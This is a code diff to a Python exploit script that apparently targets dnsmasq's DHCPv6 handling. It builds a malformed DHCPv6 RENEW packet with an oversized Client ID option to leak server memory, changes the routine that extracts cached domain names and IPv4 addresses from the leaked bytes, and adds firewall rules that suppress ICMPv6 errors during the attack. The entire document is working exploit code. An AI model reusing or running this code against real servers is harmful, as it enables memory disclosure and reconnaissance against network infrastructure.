@@ -7,13 +7,13 @@ from scapy.all import sendp, sniff, Ether, IPv6, UDP, DHCP6_Solicit, DHCP6OptRap
 from scapy.all import DHCP6OptElapsedTime, DHCP6OptClientId, DHCP6OptIA_NA, DHCP6_Reply, DHCP6OptServerId
 from socket import socket, AF_INET6, SOCK_DGRAM, SOL_SOCKET, SO_RCVBUF, AF_PACKET, SOCK_RAW, inet_pton, inet_ntoa
 from random import randint
-from netaddr import EUI
 from tm import ThreadManager
 from time import sleep
 from binascii import unhexlify
 from ipaddress import IPv6Address
 from os import stat, system
-from re import compile, search
+from re import compile
+from collections import OrderedDict
 from select import select
 from network import IPv6_raw, DHCPv6_raw
 
@@ -550,6 +550,15 @@ def gen_option(option, data, length=None):
         data])
 
 
+def inner_pkg(duid):
+        return b"".join([
+            Base.pack8(5),  # Type = DHCP6RENEW
+            Base.pack8(0), Base.pack16(1337),  # ID
+            gen_option(2, duid),  # DHCP Server DUID
+            gen_option(1, "", length=(LEAK_BYTES - 8 - 18))  # Client ID
+        ])
+
+
 def add_string_in_data(addr_in_data, string):
     a = architecture
     v = dnsmasq_version
@@ -738,15 +747,6 @@ def register_management(architecture, dnsmasq_version, register_name, register_v
         return result
 
 
-def inner_pkg(duid):
-        return b"".join([
-        Base.pack8(5),                                   # Type = DHCP6RENEW
-        Base.pack8(0), Base.pack16(1337),                # ID
-        gen_option(2, duid),                             # DHCP Server DUID
-        gen_option(1, "", length=(LEAK_BYTES - 8 - 18))  # Client ID
-    ])
-
-
 def data_leak():
     # Add iptables rules to DROP icmp packets
     system("ip6tables -A OUTPUT -p icmpv6 --icmpv6-type destination-unreachable -j DROP")
@@ -816,35 +816,27 @@ def analyze_leak_data():
     f = open(args.file_name, 'rb')
     data = f.read()
     f.close()
+    tmp_dns_cache = {}
 
-    dns_cache_offset = 0x1DA0
-    data = data[dns_cache_offset:]
+    pattern = '([A-Za-z0-9]\.|[A-Za-z0-9][A-Za-z0-9-]{0,61}[A-Za-z0-9]\.){1,3}[A-Za-z]{2,6}'
 
-    domain_offset = search(r'(\.com|\.org|\.net|\.ru)', data)
-    if domain_offset is not None:
-        index = 1
-        while data[domain_offset.start()-index] != '\x00':
-            index += 1
+    regex = compile(pattern)
 
-        pattern = data[domain_offset.start()-index-23:domain_offset.start()-index-18]
+    for match_obj in regex.finditer(data):
+        offset = match_obj.start()
+        ipv4 = data[offset-28:offset-24]
+        domain = data[match_obj.start():match_obj.end()]
+        if "\x00" not in str(ipv4):
+            tmp_dns_cache[offset] = {"addr": str(inet_ntoa(ipv4)), "name": str(domain)}
 
-        regex = compile(pattern)
-
-        for match_obj in regex.finditer(data):
-            offset = match_obj.start()
-            ipv4 = data[offset-4:offset]
-            domain = data[offset+24:data[offset+25:].find("\x00")+offset+25]
-            if "." in str(domain):
-                offset += 24 + dns_cache_offset
-                dns_cache[offset] = {"addr": str(inet_ntoa(ipv4)), "name": str(domain)}
-
-        if len(dns_cache) > 0:
-            print Base.c_success + "Leak DNS cache: "
-            for offset in dns_cache.keys():
-                print Base.c_info + "offset: " + hex(offset) + " - " \
-                      + dns_cache[offset]["name"] + ": " + dns_cache[offset]["addr"]
-        else:
-            print Base.c_error + "Do not find DNS cache in leak data!"
+    if len(tmp_dns_cache) > 0:
+        print Base.c_success + "Leak DNS cache: "
+        dns_cache = OrderedDict(sorted(tmp_dns_cache.items()))
+        for offset in dns_cache.keys():
+            print Base.c_info + "offset: " + hex(offset) + " - " \
+                  + dns_cache[offset]["name"] + ": " + dns_cache[offset]["addr"]
+    else:
+        print Base.c_error + "Do not find DNS cache in leak data!"
 
 
 def exploit():
